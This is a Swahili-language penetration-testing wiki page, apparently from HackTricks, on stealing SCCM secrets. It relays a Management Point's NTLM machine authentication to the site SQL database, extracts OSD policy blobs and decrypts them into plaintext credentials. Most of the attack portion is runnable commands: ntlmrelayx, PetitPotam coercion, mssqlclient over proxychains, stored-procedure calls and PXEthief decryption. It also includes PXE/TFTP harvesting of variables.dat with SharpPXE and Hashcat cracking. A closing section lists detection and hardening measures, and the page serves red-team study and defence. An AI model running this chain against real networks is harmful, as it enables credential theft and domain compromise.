# SCCM Management Point NTLM Relay to SQL – Utoaji wa Siri za Sera za OSD

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kuthibitisha kupitia SMB/RPC na **relaying** akaunti ya mashine ya NTLM hiyo kwa **site database (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Haki hizi zinakuwezesha kupiga seti ya stored procedures zinazofunua blobs za sera za **Operating System Deployment (OSD)** (cheti za Network Access Account, vigezo vya Task-Sequence, n.k.). Blobs hizi zimetumwa kama hex-encoded/encrypted lakini zinaweza kufanyiwa decode na decrypt kwa kutumia **PXEthief**, zikitoa siri za maandishi wazi.

Mnyororo wa hatua kwa ujumla:
1. Gundua MP & site DB ↦ endpoint ya HTTP isiyohitaji uthibitisho `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Anzisha `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Lazimisha MP kwa kutumia **PetitPotam**, PrinterBug, DFSCoerce, n.k.
4. Kupitia SOCKS proxy ungana na `mssqlclient.py -windows-auth` kama akaunti iliyorelaywa **<DOMAIN>\\<MP-host>$**.
5. Tekeleza:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (au `MP_GetPolicyBodyAfterAuthorization`)
6. Ondoa `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Siri kama `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, n.k. zinapatikana bila kugusa PXE au clients.

---

## 1. Enumerating unauthenticated MP endpoints
Upanuzi wa MP ISAPI **GetAuth.dll** unaonyesha vigezo kadhaa ambavyo havihitaji uthibitisho (isipokuwa site ni PKI-tu):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Inarudisha ufunguo wa umma wa cheti cha kusaini cha site + GUIDs za *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Inaorodhesha kila Management-Point katika site. |
| `SITESIGNCERT` | Inarudisha cheti cha kusaini cha Primary-Site (kutambua site server bila LDAP). |

Chukua GUIDs zitakazotumika kama **clientID** kwa queries za DB baadaye:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
## 2. Relay akaunti ya mashine ya MP hadi MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wakati coercion inapoanzishwa utapaswa kuona kitu kama:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---
## 3. Tambua sera za OSD kupitia stored procedures
Unganisha kupitia SOCKS proxy (port 1080 kwa chaguo-msingi):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Hama hadi **CM_<SiteCode>** DB (tumia msimbo wa tovuti wa tarakimu 3, kwa mfano `CM_001`).

### 3.1  Tafuta Unknown-Computer GUIDs (hiari)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Orodhesha sera zilizoteuliwa
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Kila mstari una `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Lenga sera:
* **NAAConfig**  – nywila za akaunti ya Network Access
* **TS_Sequence** – vigezo vya Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Inaweza kujumuisha akaunti za run-as

### 3.3  Pata mwili kamili
Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kuruka hitaji la clientID kwa kutumia:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> MUHIMU: Katika SSMS ongeza “Maximum Characters Retrieved” (>65535) au blob itakatwa.

---

## 4. Decode & decrypt the blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Mfano wa siri zilizopatikana:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Majukumu na taratibu muhimu za SQL
Baada ya relay, login imepangwa kwa:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Roles hizi zinaonyesha ruhusa nyingi za EXEC, muhimu zinazotumika katika shambulio hili ni:

| Taratibu zilizohifadhiwa | Madhumuni |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Orodhesha sera zilizotumika kwa `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Rudisha maudhui kamili ya sera. |
| `MP_GetListOfMPsInSiteOSD` | Inarudishwa na njia ya `MPKEYINFORMATIONMEDIA`. |

Unaweza kukagua orodha kamili kwa:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Kukusanya vyombo vya kuanzisha vya PXE (SharpPXE)
* **PXE reply over UDP/4011**: tuma ombi la PXE boot kwa Distribution Point iliyosanidiwa kwa PXE. Jibu la proxyDHCP linaonyesha njia za boot kama `SMSBoot\\x64\\pxe\\variables.dat` (configured iliyosimbwa) na `SMSBoot\\x64\\pxe\\boot.bcd`, pamoja na blob ya ufunguo iliyosimbwa kwa hiari.
* **Pata vibaki vya boot kupitia TFTP**: tumia njia zilizorejeshwa kupakua `variables.dat` kupitia TFTP (bila uthibitisho). Faili ni ndogo (KB chache) na ina variables za media zilizososimbwa.
* **Dekripti au kuvunja**:
- Ikiwa jibu lina ufunguo wa decryption, ulipe kwa **SharpPXE** ili kufungua `variables.dat` moja kwa moja.
- Ikiwa hakuna ufunguo umepewa (PXE media zinalindwa na nenosiri maalum), SharpPXE itatoa hash inayolingana na **Hashcat** `$sccm$aes128$...` kwa kuvunja offline. Baada ya kupata nenosiri, fungua faili.
* **Chambua XML iliyofunguliwa**: variables za plain text zina metadata za deployment za SCCM (**Management Point URL**, **Site Code**, media GUIDs, na vibonye vingine). SharpPXE inavitafsiri na kuchapisha amri tayari-kuendeshwa ya **SharpSCCM** yenye vigezo vya GUID/PFX/site vimejazwa tayari kwa matumizi ya kuendelea (abuse).
* **Mahitaji**: tu ufikivu wa mtandao kwa msikilizaji wa PXE (UDP/4011) na TFTP; hakuna vibali vya admin vya eneo vinavyohitajika.

---

## 7. Utambuzi & Kuimarisha Usalama
1. **Fuatilia kuingia kwa MP** – akaunti yoyote ya kompyuta ya MP inayojiingia kutoka IP ambayo si mwenyeji wake ≈ relay.
2. Washa **Extended Protection for Authentication (EPA)** kwenye database ya site (`PREVENT-14`).
3. Zima NTLM zisizotumika, tilia nguvu kusaini SMB, punguza ufikiaji wa RPC (madhubuti ya kupunguza hatari sawa yanayotumika dhidi ya `PetitPotam`/`PrinterBug`).
4. Imarisha mawasiliano MP ↔ DB kwa IPSec / mutual-TLS.
5. **Punguza ufichuzi wa PXE** – weka firewall ili kurestrict UDP/4011 na TFTP kwa VLAN zinazotegemewa, hitaji nenosiri la PXE, na tuma onyo kuhusu upakuaji wa TFTP wa `SMSBoot\\*\\pxe\\variables.dat`.

---

## Angalia pia
* Misingi ya NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Marejeo
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
